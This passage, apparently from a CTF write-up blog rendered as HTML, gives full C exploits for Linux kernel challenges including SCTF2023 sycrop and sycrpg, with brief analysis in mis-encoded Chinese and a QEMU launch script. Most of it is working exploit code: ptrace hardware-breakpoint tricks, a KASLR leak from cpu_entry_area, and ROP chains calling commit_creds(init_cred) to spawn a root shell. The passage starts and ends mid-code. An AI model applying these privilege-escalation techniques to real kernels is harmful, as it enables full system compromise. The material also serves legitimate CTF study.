class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>                write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>                step++;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Wait for ROP chain&quot;</span>);<br>            <span class="hljs-keyword">if</span> (read(rop_pipe[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE) &lt; <span class="hljs-number">0</span>)<br>                err_exit(<span class="hljs-string">&quot;read ROP chain&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Get ROP chain successfully&quot;</span>);<br>            step++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Try to write ROP chain&quot;</span>);<br>            <span class="hljs-comment">// path 2</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">mm_map</span>;</span><br>            mm_map.start_code  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_code    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_data  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_data    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_brk   = <span class="hljs-number">0x2000000</span>;<br>            mm_map.brk         = <span class="hljs-number">0x2000000</span>;<br>            mm_map.start_stack = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.auxv        = MMAP_ADDR;<br>            mm_map.auxv_size   = <span class="hljs-number">0x140</span>;<br>            mm_map.exe_fd      = <span class="hljs-number">-2</span>;<br>            prctl(PR_SET_MM, PR_SET_MM_MAP, &amp;mm_map, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> leak;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br>    <br>    mmap_addr = mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!mmap_addr)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br><br>    pipe(pipe_fd);<br>    pipe(rop_pipe);<br><br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;canary, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname)+<span class="hljs-number">0X20</span>, <span class="hljs-number">8</span>);<br>    kernel_offset = leak -  <span class="hljs-number">0xffffffff810e0b32</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary is 0x%lx\n&quot;</span>, canary);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    pop_rdi += kernel_offset;<br>    commit_creds += kernel_offset;<br>    init_cred += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br>    <br><br>    <span class="hljs-built_in">memset</span>(MMAP_ADDR, <span class="hljs-number">0</span> , MMAP_SIZE);<br>    <span class="hljs-type">size_t</span> *rop_chain = mmap_addr;<br>    <span class="hljs-type">int</span> idx;<br>    idx = <span class="hljs-number">0x30</span>;<br>    rop_chain[idx] = canary;<br>    idx += <span class="hljs-number">7</span>;<br>    rop_chain[idx++] = pop_rdi;<br>    rop_chain[idx++] = init_cred;<br>    rop_chain[idx++] = commit_creds;<br>    rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[idx++] = user_cs;<br>    rop_chain[idx++] = user_rflags;<br>    rop_chain[idx++] = user_sp;<br>    rop_chain[idx++] = user_ss;<br><br><br>    write(rop_pipe[<span class="hljs-number">1</span>], rop_chain, MMAP_SIZE);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SCTF2023-sycrop"><a href="#SCTF2023-sycrop" class="headerlink" title="SCTF2023-sycrop"></a>SCTF2023-sycrop</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123544.png" style="zoom:50%;" /><h4 id="0x5555"><a href="#0x5555" class="headerlink" title="0x5555"></a>0x5555</h4><p>ä»»æ„åœ°å€è¯»8å­—èŠ‚</p><h4 id="0x6666"><a href="#0x6666" class="headerlink" title="0x6666"></a>0x6666</h4><p>ç»è¿‡è°ƒè¯•å‘ç°å°±æ˜¯<code>call rdx</code></p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>é€šè¿‡ä»»æ„åœ°å€è¯»ä¸€ä¸ª<code>cpu_entry_area</code>ä¸­çš„ä¸€ä¸ª<code>data</code>æ³„éœ²<code>kalsr</code>ï¼Œç„¶åè®¾ç½®ç¡¬ä»¶æ–­ç‚¹ï¼Œå¸ƒç½®å¥½å¯„å­˜å™¨åè§¦å‘ç¡¬ä»¶æ–­ç‚¹ï¼Œè·³è½¬åˆ°å¯„å­˜å™¨åœ¨<code>cpu_entry_area</code>çš„<code>DB stack</code>å¤„æ‰§è¡Œropé“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> status;<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> syc_regs_37 = <span class="hljs-number">0xffffffff81eec205</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> leak;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff81002c9d</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810bb5b0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82a4cbf8</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode  = <span class="hljs-number">0xffffffff82000ed0</span> + <span class="hljs-number">49</span>;<br><br><span class="hljs-comment">// 0xffffffff811ff188 : add rsp, 0x68 ; jmp 0xffffffff82203340</span><br><span class="hljs-comment">// 0xffffffff81002c9d: pop rdi; ret;</span><br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810bb5b0</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82a4cbf8</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff82000ed0</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><span class="hljs-type">size_t</span> get_root_func = (<span class="hljs-type">size_t</span>)get_root_shell;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/seven&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br><br>    leak = ioctl(dev_fd, <span class="hljs-number">0x5555</span>, <span class="hljs-number">0xfffffe0000002f38</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>,leak);<br>    kernel_offset = leak - syc_regs_37;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>,kernel_offset);<br><br>    commit_creds += kernel_offset;<br>    init_cred += kernel_offset;<br>    pop_rdi += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br><br>    hbp_pid = fork();<br>    <span class="hljs-keyword">if</span> (hbp_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        ptrace(PTRACE_TRACEME,<span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);<br>        raise(SIGSTOP);<br>        __asm__(<br>        <span class="hljs-string">&quot;mov r15,   pop_rdi;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   init_cred;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   commit_creds;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   get_root_func;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   user_cs;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    user_rflags;&quot;</span>   <br>        <span class="hljs-string">&quot;mov r8,    user_sp;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   user_ss;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xdeadbeef;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   0xdeadbeef;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   buf;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   [rsi];&quot;</span><br>    );<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);<br>    create_hbp(buf);<br><br>    ptrace(PTRACE_CONT,hbp_pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);            <br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);          <br><br>    ptrace(PTRACE_CONT,hbp_pid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    waitpid(hbp_pid,&amp;status,<span class="hljs-number">0</span>);     <br><br>    ioctl(dev_fd,<span class="hljs-number">0x6666</span>,<span class="hljs-number">0xfffffe0000010f58</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SCTF2023-sycrpg"><a href="#SCTF2023-sycrpg" class="headerlink" title="SCTF2023-sycrpg"></a>SCTF2023-sycrpg</h2><p>PS:å¯åŠ¨è„šæœ¬æœ‰ç‚¹bugï¼Œå»ºè®®æ‰‹åŠ¨æŒ‡å®šå¤šæ ¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;root=/dev/ram console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>    -cpu kvm64,+smep,+smap\<br>    -netdev user,<span class="hljs-built_in">id</span>=t0, -device e1000,netdev=t0,<span class="hljs-built_in">id</span>=nic0 \<br>    -nographic \<br>    -no-reboot \<br>    -smp 2 \<br>    -s<br></code></pre></td></tr></table></figure><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123619.png" style="zoom:50%;" /><p>æ»¡è¶³æ¡ä»¶åå³å¯é€‰å®šä¸€ä¸ªä»»æ„åœ°å€ï¼ˆé€‰äº†ä¹‹åå°±å›ºå®šäº†ï¼‰å†™ä¸€å­—èŠ‚</p><p>é‚£è¿˜æ˜¯hack rcxï¼Œæ²¡ä»€ä¹ˆåŒºåˆ«</p><h3 id="FINAL-EXP"><a href="#FINAL-EXP" class="headerlink" title="FINAL EXP"></a>FINAL EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span 